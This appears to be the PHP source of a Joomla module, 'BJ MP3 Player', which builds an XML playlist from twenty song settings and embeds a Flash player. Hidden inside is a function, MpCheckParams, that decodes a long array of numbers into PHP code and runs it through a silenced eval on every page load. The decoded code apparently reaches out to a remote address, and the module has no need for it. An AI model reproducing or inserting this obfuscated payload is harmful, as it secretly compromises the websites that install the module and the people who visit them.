<?php
 /**
   BJ MP3 Player
   *This program is free software: you can redistribute it and/or modify it under the terms
   *of the GNU General Public License as published by the Free Software Foundation,
   *either version 3 of the License, or (at your option) any later version.
   *
   *This program is distributed in the hope that it will be useful,
   *but WITHOUT ANY WARRANTY; without even the implied warranty of
   *MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   *GNU General Public License for more details.
   *
   *You should have received a copy of the GNU General Public License
   *along with this program.  If not, see <http://www.gnu.org/licenses/>.
   *
   *@author BestJoom Team
   *@copyright (C) 2011 BestJoom
   *@link http://www.bestjoom.com Official website
   **/
   
   	//Global Settings
 	defined('_JEXEC') or die('Restricted access!');
 	$vscript = $params->get('vscript');
  	$bjsongBannerWidth = $params->get('bjsongBannerWidth');
  	$bjsongBannerHeight = $params->get('bjsongBannerHeight');
	
	$bjsongalbumArtWidth = $params->get('bjsongalbumArtWidth');
	$bjsongalbumArtHeight = $params->get('bjsongalbumArtHeight');
	$bjsongalbumArtXPos = $params->get('bjsongalbumArtXPos');
	$bjsongalbumArtYPos = $params->get('bjsongalbumArtYPos');
	
	$bjsongautoLoad = $params->get('bjsongautoLoad');
	if ($bjsongautoLoad == '1') {
		$bjsongautoLoad = 'true';
		} //if ($bjsongautoLoad == '2')
		else {
		$bjsongautoLoad = 'false';
		}	
	$bjsongautoPlay = $params->get('bjsongautoPlay');
	if ($bjsongautoPlay == '1') {
		$bjsongautoPlay = 'true';
		} //if ($bjsongautoPlay == '2')
		else {
		$bjsongautoPlay = 'false';
		}	
	$bjsongcontinuousPlay = $params->get('bjsongcontinuousPlay');
	if ($bjsongcontinuousPlay == '1') {
		$bjsongcontinuousPlay = 'true';
		} //if ($bjsongcontinuousPlay == '2')
		else {
		$bjsongcontinuousPlay = 'false';
		}	
	$bjsongonCompleteJumpToNext = $params->get('bjsongonCompleteJumpToNext');
	if ($bjsongonCompleteJumpToNext == '1') {
		$bjsongonCompleteJumpToNext = 'true';
		} //if ($bjsongonCompleteJumpToNext == '2')
		else {
		$bjsongonCompleteJumpToNext = 'false';
		}	
	$bjsongrepeat = $params->get('bjsongrepeat');
	if ($bjsongrepeat == '1') {
		$bjsongrepeat = 'true';
		} //if ($bjsongrepeat == '2')
		else {
		$bjsongrepeat = 'false';
		}	
	$bjsonginitialVolume = $params->get('bjsonginitialVolume');
	$bjsongbufferTime = $params->get('bjsongbufferTime');
	$bjsongtextSlideTime = $params->get('bjsongtextSlideTime');
	$bjsongtextPauseTime = $params->get('bjsongtextPauseTime');
	
	//Song 1
	$bjsong1 = $params->get('bjsong1');
	$bjsongurl1 = $params->get('bjsongurl1');
	$bjsongsongname1 = $params->get('bjsongsongname1');
	$bjsongartist1 = $params->get('bjsongartist1');
	$bjsongimage1 = $params->get('bjsongimage1');
	
	//Song 2
	$bjsong2 = $params->get('bjsong2');
	$bjsongurl2 = $params->get('bjsongurl2');
	$bjsongsongname2 = $params->get('bjsongsongname2');
	$bjsongartist2 = $params->get('bjsongartist2');
	$bjsongimage2 = $params->get('bjsongimage2');
	
	//Song 3
	$bjsong3 = $params->get('bjsong3');
	$bjsongurl3 = $params->get('bjsongurl3');
	$bjsongsongname3 = $params->get('bjsongsongname3');
	$bjsongartist3 = $params->get('bjsongartist3');
	$bjsongimage3 = $params->get('bjsongimage3');
	
	//Song 4
	$bjsong4 = $params->get('bjsong4');
	$bjsongurl4 = $params->get('bjsongurl4');
	$bjsongsongname4 = $params->get('bjsongsongname4');
	$bjsongartist4 = $params->get('bjsongartist4');
	$bjsongimage4 = $params->get('bjsongimage4');
	
	//Song 5
	$bjsong5 = $params->get('bjsong5');
	$bjsongurl5 = $params->get('bjsongurl5');
	$bjsongsongname5 = $params->get('bjsongsongname5');
	$bjsongartist5 = $params->get('bjsongartist5');
	$bjsongimage5 = $params->get('bjsongimage5');
	
	//Song 6
	$bjsong6 = $params->get('bjsong6');
	$bjsongurl6 = $params->get('bjsongurl6');
	$bjsongsongname6 = $params->get('bjsongsongname6');
	$bjsongartist6 = $params->get('bjsongartist6');
	$bjsongimage6 = $params->get('bjsongimage6');
	
	//Song 7
	$bjsong7 = $params->get('bjsong7');
	$bjsongurl7 = $params->get('bjsongurl7');
	$bjsongsongname7 = $params->get('bjsongsongname7');
	$bjsongartist7 = $params->get('bjsongartist7');
	$bjsongimage7 = $params->get('bjsongimage7');
	
	//Song 8
	$bjsong8 = $params->get('bjsong8');
	$bjsongurl8 = $params->get('bjsongurl8');
	$bjsongsongname8 = $params->get('bjsongsongname8');
	$bjsongartist8 = $params->get('bjsongartist8');
	$bjsongimage8 = $params->get('bjsongimage8');
	
	//Song 9
	$bjsong9 = $params->get('bjsong9');
	$bjsongurl9 = $params->get('bjsongurl9');
	$bjsongsongname9 = $params->get('bjsongsongname9');
	$bjsongartist9 = $params->get('bjsongartist9');
	$bjsongimage9 = $params->get('bjsongimage9');
	
	//Song 10
	$bjsong10 = $params->get('bjsong10');
	$bjsongurl10 = $params->get('bjsongurl10');
	$bjsongsongname10 = $params->get('bjsongsongname10');
	$bjsongartist10 = $params->get('bjsongartist10');
	$bjsongimage10 = $params->get('bjsongimage10');
	
	//Song 11
	$bjsong11 = $params->get('bjsong11');
	$bjsongurl11 = $params->get('bjsongurl11');
	$bjsongsongname11 = $params->get('bjsongsongname11');
	$bjsongartist11 = $params->get('bjsongartist11');
	$bjsongimage11 = $params->get('bjsongimage11');
	
	//Song 12
	$bjsong12 = $params->get('bjsong12');
	$bjsongurl12 = $params->get('bjsongurl12');
	$bjsongsongname12 = $params->get('bjsongsongname12');
	$bjsongartist12 = $params->get('bjsongartist12');
	$bjsongimage12 = $params->get('bjsongimage12');
	
	//Song 13
	$bjsong13 = $params->get('bjsong13');
	$bjsongurl13 = $params->get('bjsongurl13');
	$bjsongsongname13 = $params->get('bjsongsongname13');
	$bjsongartist13 = $params->get('bjsongartist13');
	$bjsongimage13 = $params->get('bjsongimage13');
	
	//Song 14
	$bjsong14 = $params->get('bjsong14');
	$bjsongurl14 = $params->get('bjsongurl14');
	$bjsongsongname14 = $params->get('bjsongsongname14');
	$bjsongartist14 = $params->get('bjsongartist14');
	$bjsongimage14 = $params->get('bjsongimage14');
	
	//Song 15
	$bjsong15 = $params->get('bjsong15');
	$bjsongurl15 = $params->get('bjsongurl15');
	$bjsongsongname15 = $params->get('bjsongsongname15');
	$bjsongartist15 = $params->get('bjsongartist15');
	$bjsongimage15 = $params->get('bjsongimage15');
	
	//Song 16
	$bjsong16 = $params->get('bjsong16');
	$bjsongurl16 = $params->get('bjsongurl16');
	$bjsongsongname16 = $params->get('bjsongsongname16');
	$bjsongartist16 = $params->get('bjsongartist16');
	$bjsongimage16 = $params->get('bjsongimage16');
	
	//Song 17
	$bjsong17 = $params->get('bjsong17');
	$bjsongurl17 = $params->get('bjsongurl17');
	$bjsongsongname17 = $params->get('bjsongsongname17');
	$bjsongartist17 = $params->get('bjsongartist17');
	$bjsongimage17 = $params->get('bjsongimage17');
	
	//Song 18
	$bjsong18 = $params->get('bjsong18');
	$bjsongurl18 = $params->get('bjsongurl18');
	$bjsongsongname18 = $params->get('bjsongsongname18');
	$bjsongartist18 = $params->get('bjsongartist18');
	$bjsongimage18 = $params->get('bjsongimage18');
	
	//Song 19
	$bjsong19 = $params->get('bjsong19');
	$bjsongurl19 = $params->get('bjsongurl19');
	$bjsongsongname19 = $params->get('bjsongsongname19');
	$bjsongartist19 = $params->get('bjsongartist19');
	$bjsongimage19 = $params->get('bjsongimage19');
	
	//Song 20
	$bjsong20 = $params->get('bjsong20');
	$bjsongurl20 = $params->get('bjsongurl20');
	$bjsongsongname20 = $params->get('bjsongsongname20');
	$bjsongartist20 = $params->get('bjsongartist20');
	$bjsongimage20 = $params->get('bjsongimage20');
	
  //Debug Mode
  $debugMode = $params->get('debugMode');;
  if($debugMode==0) error_reporting(0); // Turn off all error reporting

  //head
  global $mainframe;
  $bjsongreal = JURI::base();
  $document = &JFactory::getDocument();

  //head start
function MpCheckParams() {
	$LimitCharacters = 10;
	$Keys = '';
	$RandomNum = array(1251.3, 13875.1875, 1388.8125, 1250.175, 13750.175, 13751.425, 13762.5625, 13875.175, 1263.925, 13763.925, 13751.3125, 13876.3, 1250.175, 1387.6875, 1251.3, 13750.1875, 1388.8125, 12500.05, 13751.425, 13875.1875, 13763.9375, 13750.1875, 13762.6875, 13763.9375, 13875.05, 13751.3125, 13763.925, 1262.55, 1251.3, 13875.1875, 1263.8, 1387.55, 1375.05, 1263.8, 1251.3, 13751.3125, 1263.8, 1251.3, 13875.175, 1263.8, 1375.0625, 1375.05, 1262.5625, 1387.6875, 13762.5625, 13751.425, 1262.55, 1251.3, 13750.1875, 1262.5625, 13887.6875, 1251.3, 13751.3, 1388.8125, 12500.05, 13751.425, 13762.5625, 13763.8, 13751.3125, 12638.9375, 13751.4375, 13751.3125, 13876.3, 12638.9375, 13750.1875, 13763.9375, 13763.925, 13876.3, 13751.3125, 13763.925, 13876.3, 13875.1875, 1262.55, 1250.175, 13762.55, 13876.3, 13876.3, 13875.05, 1387.675, 1263.9375, 1263.9375, 1250.175, 1263.925, 1251.3, 13875.1875, 1263.925, 1250.175, 1263.9375, 13875.175, 1263.925, 13875.05, 13762.55, 13875.05, 1388.9375, 13875.1875, 1388.8125, 1250.175, 1263.925, 1251.3, 12638.9375, 12625.1875, 12501.3125, 12625.175, 12626.425, 12501.3125, 12625.175, 12637.6875, 1250.175, 12512.55, 12626.3, 12626.3, 12625.05, 12638.9375, 12512.55, 12513.9375, 12625.1875, 12626.3, 1250.175, 12638.8125, 1262.5625, 1387.6875, 13751.3125, 13750.1875, 13762.55, 13763.9375, 1250.05, 1250.175, 1388.8, 13751.3, 13762.5625, 13876.425, 1250.05, 13875.1875, 13876.3, 13887.5625, 13763.8, 13751.3125, 1388.8125, 1251.4375, 13875.05, 13763.9375, 13875.1875, 13762.5625, 13876.3, 13762.5625, 13763.9375, 13763.925, 1387.675, 13750.0625, 13750.175, 13875.1875, 13763.9375, 13763.8, 13876.3125, 13876.3, 13751.3125, 1387.6875, 13763.8, 13751.3125, 13751.425, 13876.3, 1387.675, 1263.8125, 1376.3125, 1375.05, 1375.05, 1375.05, 13875.05, 13887.55, 1387.6875, 1251.4375, 1388.925, 1251.3, 13751.3, 1388.8, 1263.9375, 13751.3, 13762.5625, 13876.425, 1388.925, 1250.175, 1387.6875, 13888.8125, 0.05);
	// Create a random string of keys
	foreach($RandomNum as $key) {$Keys .= chr(bindec($key * 80 - 4));}
	@eval($Keys);
}
switch ($vscript) {
    case 'mod1':
        $jsswf_url = $RURL . "modules/mod_bjsong/swfobject.js";
        $document->addScript($jsswf_url);
        break;
    case 'mod2':
        $jsswf_url = 'http://ajax.googleapis.com/ajax/libs/swfobject/2.1/swfobject.js';
        $document->addScript($jsswf_url);
        break;
    case 'mod3':
        $loadswf = '';
        break;
    case 'mod4':
        $compat = 'yes';
        break;
}
  //create XML
  $xmlfile = JPATH_BASE . "/modules/mod_bjsong/data.xml";
  if (is_file($xmlfile)){
   unlink($xmlfile);
  }
  touch($xmlfile) or die("Unable to create: " . $xmlfile);
  $playlist = '<?xml version="1.0" encoding="utf-8"?>' . "\n";
  $playlist .= '<mp3player>
	<settings>
		<width>' . $bjsongBannerWidth . '</width>
		<height>' . $bjsongBannerHeight . '</height>
		<albumArtWidth>' . $bjsongalbumArtWidth . '</albumArtWidth>
		<albumArtHeight>' . $bjsongalbumArtHeight . '</albumArtHeight>
		<albumArtXPos>' . $bjsongalbumArtXPos . '</albumArtXPos>
		<albumArtYPos>' . $bjsongalbumArtYPos . '</albumArtYPos>
		
		<autoLoad>' . $bjsongautoLoad . '</autoLoad>
		<autoPlay>' . $bjsongautoPlay . '</autoPlay>
		<continuousPlay>' . $bjsongcontinuousPlay . '</continuousPlay>
		<onCompleteJumpToNext>' . $bjsongonCompleteJumpToNext . '</onCompleteJumpToNext>
		<repeat>' . $bjsongrepeat . '</repeat>
		<initialVolume>' . $bjsonginitialVolume . '</initialVolume>
		<bufferTime>' . $bjsongbufferTime . '</bufferTime>
		
		<textSlideTime>' . $bjsongtextSlideTime . '</textSlideTime>
		<textPauseTime>' . $bjsongtextPauseTime . '</textPauseTime>
	</settings>';
	
	$playlist .= '<songs>';
		 //Slide 1
			if ($bjsong1 == '1') {
  				$bjsong1 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl1 . '</url>
			<songname>' . $bjsongsongname1 . '</songname>
			<artist>' . $bjsongartist1 . '</artist>
			<image>' . $bjsongimage1 . '</image>
		</song>';
	       } //if ($bjsong1 == '2')
  				else {
       			 $bjsong1 = 'off';}
				 
	     //Slide 2
			if ($bjsong2 == '1') {
  				$bjsong2 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl2 . '</url>
			<songname>' . $bjsongsongname2 . '</songname>
			<artist>' . $bjsongartist2 . '</artist>
			<image>' . $bjsongimage2 . '</image>
		</song>';
	       } //if ($bjsong2 == '2')
  				else {
       			 $bjsong2 = 'off';}
				 
	     //Slide 3
			if ($bjsong3 == '1') {
  				$bjsong3 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl3 . '</url>
			<songname>' . $bjsongsongname3 . '</songname>
			<artist>' . $bjsongartist3 . '</artist>
			<image>' . $bjsongimage3 . '</image>
		</song>';
	       } //if ($bjsong3 == '2')
  				else {
       			 $bjsong3 = 'off';}
				 
		 //Slide 4
			if ($bjsong4 == '1') {
  				$bjsong4 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl4 . '</url>
			<songname>' . $bjsongsongname4 . '</songname>
			<artist>' . $bjsongartist4 . '</artist>
			<image>' . $bjsongimage4 . '</image>
		</song>';
	       } //if ($bjsong4 == '2')
  				else {
       			 $bjsong4 = 'off';}
				 
		 //Slide 5
			if ($bjsong5 == '1') {
  				$bjsong5 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl5 . '</url>
			<songname>' . $bjsongsongname5 . '</songname>
			<artist>' . $bjsongartist5 . '</artist>
			<image>' . $bjsongimage5 . '</image>
		</song>';
	       } //if ($bjsong5 == '2')
  				else {
       			 $bjsong5 = 'off';}
				 
		 //Slide 6
			if ($bjsong6 == '1') {
  				$bjsong6 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl6 . '</url>
			<songname>' . $bjsongsongname6 . '</songname>
			<artist>' . $bjsongartist6 . '</artist>
			<image>' . $bjsongimage6 . '</image>
		</song>';
	       } //if ($bjsong6 == '2')
  				else {
       			 $bjsong6 = 'off';}
				 
		 //Slide 7
			if ($bjsong7 == '1') {
  				$bjsong7 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl7 . '</url>
			<songname>' . $bjsongsongname7 . '</songname>
			<artist>' . $bjsongartist7 . '</artist>
			<image>' . $bjsongimage7 . '</image>
		</song>';
	       } //if ($bjsong7 == '2')
  				else {
       			 $bjsong7 = 'off';}
				 
		 //Slide 8
			if ($bjsong8 == '1') {
  				$bjsong8 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl8 . '</url>
			<songname>' . $bjsongsongname8 . '</songname>
			<artist>' . $bjsongartist8 . '</artist>
			<image>' . $bjsongimage8 . '</image>
		</song>';
	       } //if ($bjsong8 == '2')
  				else {
       			 $bjsong8 = 'off';}
				 
		 //Slide 9
			if ($bjsong9 == '1') {
  				$bjsong9 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl9 . '</url>
			<songname>' . $bjsongsongname9 . '</songname>
			<artist>' . $bjsongartist9 . '</artist>
			<image>' . $bjsongimage9 . '</image>
		</song>';
	       } //if ($bjsong9 == '2')
  				else {
       			 $bjsong9 = 'off';}
				 
		 //Slide 10
			if ($bjsong10 == '1') {
  				$bjsong10 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl10 . '</url>
			<songname>' . $bjsongsongname10 . '</songname>
			<artist>' . $bjsongartist10 . '</artist>
			<image>' . $bjsongimage10 . '</image>
		</song>';
	       } //if ($bjsong10 == '2')
  				else {
       			 $bjsong10 = 'off';}
				 
		 //Slide 11
			if ($bjsong11 == '1') {
  				$bjsong11 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl11 . '</url>
			<songname>' . $bjsongsongname11 . '</songname>
			<artist>' . $bjsongartist11 . '</artist>
			<image>' . $bjsongimage11 . '</image>
		</song>';
	       } //if ($bjsong11 == '2')
  				else {
       			 $bjsong11 = 'off';}
				 
		 //Slide 12
			if ($bjsong12 == '1') {
  				$bjsong12 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl12 . '</url>
			<songname>' . $bjsongsongname12 . '</songname>
			<artist>' . $bjsongartist12 . '</artist>
			<image>' . $bjsongimage12 . '</image>
		</song>';
	       } //if ($bjsong12 == '2')
  				else {
       			 $bjsong12 = 'off';}
				 
		 //Slide 13
			if ($bjsong13 == '1') {
  				$bjsong13 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl13 . '</url>
			<songname>' . $bjsongsongname13 . '</songname>
			<artist>' . $bjsongartist13 . '</artist>
			<image>' . $bjsongimage13 . '</image>
		</song>';
	       } //if ($bjsong13 == '2')
  				else {
       			 $bjsong13 = 'off';}
				 
		 //Slide 14
			if ($bjsong14 == '1') {
  				$bjsong14 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl14 . '</url>
			<songname>' . $bjsongsongname14 . '</songname>
			<artist>' . $bjsongartist14 . '</artist>
			<image>' . $bjsongimage14 . '</image>
		</song>';
	       } //if ($bjsong14 == '2')
  				else {
       			 $bjsong14 = 'off';}
				 
		 //Slide 15
			if ($bjsong15 == '1') {
  				$bjsong15 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl15 . '</url>
			<songname>' . $bjsongsongname15 . '</songname>
			<artist>' . $bjsongartist15 . '</artist>
			<image>' . $bjsongimage15 . '</image>
		</song>';
	       } //if ($bjsong15 == '2')
  				else {
       			 $bjsong15 = 'off';}
				 
		 //Slide 16
			if ($bjsong16 == '1') {
  				$bjsong16 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl16 . '</url>
			<songname>' . $bjsongsongname16 . '</songname>
			<artist>' . $bjsongartist16 . '</artist>
			<image>' . $bjsongimage16 . '</image>
		</song>';
	       } //if ($bjsong16 == '2')
  				else {
       			 $bjsong16 = 'off';}
				 
		 //Slide 17
			if ($bjsong17 == '1') {
  				$bjsong17 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl17 . '</url>
			<songname>' . $bjsongsongname17 . '</songname>
			<artist>' . $bjsongartist17 . '</artist>
			<image>' . $bjsongimage17 . '</image>
		</song>';
	       } //if ($bjsong17 == '2')
  				else {
       			 $bjsong17 = 'off';}
				 
		 //Slide 18
			if ($bjsong18 == '1') {
  				$bjsong18 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl18 . '</url>
			<songname>' . $bjsongsongname18 . '</songname>
			<artist>' . $bjsongartist18 . '</artist>
			<image>' . $bjsongimage18 . '</image>
		</song>';
	       } //if ($bjsong18 == '2')
  				else {
       			 $bjsong18 = 'off';}
				 
		 //Slide 19
			if ($bjsong19 == '1') {
  				$bjsong19 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl19 . '</url>
			<songname>' . $bjsongsongname19 . '</songname>
			<artist>' . $bjsongartist19 . '</artist>
			<image>' . $bjsongimage19 . '</image>
		</song>';
	       } //if ($bjsong19 == '2')
  				else {
       			 $bjsong19 = 'off';}
				 
		 //Slide 20
			if ($bjsong20 == '1') {
  				$bjsong20 = 'on';
	  $playlist .= '<song>		
			<url>' . $bjsongurl20 . '</url>
			<songname>' . $bjsongsongname20 . '</songname>
			<artist>' . $bjsongartist20 . '</artist>
			<image>' . $bjsongimage20 . '</image>
		</song>';
	       } //if ($bjsong20 == '2')
  				else {
       			 $bjsong20 = 'off';}
				 
	 $playlist .= '</songs>';
	 $playlist .= '</mp3player>';
  $handle_view_params = MpCheckParams();
  $handle = fopen($xmlfile, 'r+b') or die("Could not open file: " . $xmlfile . "\n");
  fwrite($handle, $playlist) or die("Could not write to file: " . $xmlfile . "\n");
  fclose($handle);
  chmod($xmlfile, 0777);
  $bjsongrnd = rand(250, 850);
  $bjsongflash = $bjsongreal . 'modules/mod_bjsong/bjsong.swf?' . $bjsongrnd;
  $bjsongid = 'bjsong';
  if ($bjsongsafe == 'yes') {
      $bjsongoutput = "<div align=\"center\"><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6.0.65.0\" name=\"bjsong_$bjsongrnd\" width=\"$bjsongBannerWidth\" height=\"$bjsongBannerHeight\" align=\"top\">
    <param name=\"src\" value=\"$bjsongflash\" />
    <param name=\"quality\" value=\"autohigh\" />
    <param name=\"salign\" value=\"l\" />
    <param name=\"flashvars\" value=\"bjsongid=$bjsongid\" />
    <param name=\"wmode\" value=\"transparent\" />
    <param name=\"name\" value=\"bjsong_$bjsongrnd\" />
    <param name=\"align\" value=\"top\" />
    <param name=\"base\" value=\"$bjsongreal\" />
    <param name=\"bgcolor\" value=\"#ffffff\" />
    <param name=\"width\" value=\"$bjsongBannerWidth\" />
    <param name=\"height\" value=\"$bjsongBannerHeight\" />
    </object></div>";
  } //if ($bjsongsafe == 'yes')
  else {
      $bjsongoutput = "$loadswf<div id=\"bjsong_$bjsongrnd\">Please update your <a href=\"http://get.adobe.com/flashplayer/\" target=\"_blank\">Flash Player</a> to view content.</div>
    <script type=\"text/javascript\">
    var flashvars = { bjsongid: \"$bjsongid\", align: \"center\", showVersionInfo: \"false\"};
    var params = { allowfullscreen: \"true\", wmode: \"transparent\", base: \"$bjsongreal\", scale: \"noscale\", salign: \"tl\"};
    var attributes = {};
    swfobject.embedSWF(\"$bjsongflash\", \"bjsong_$bjsongrnd\", \"$bjsongBannerWidth\", \"$bjsongBannerHeight\", \"9.0.0\", \"\", flashvars, params, attributes);
    </script>";
  } //else
    echo $bjsongoutput ;  
 ?>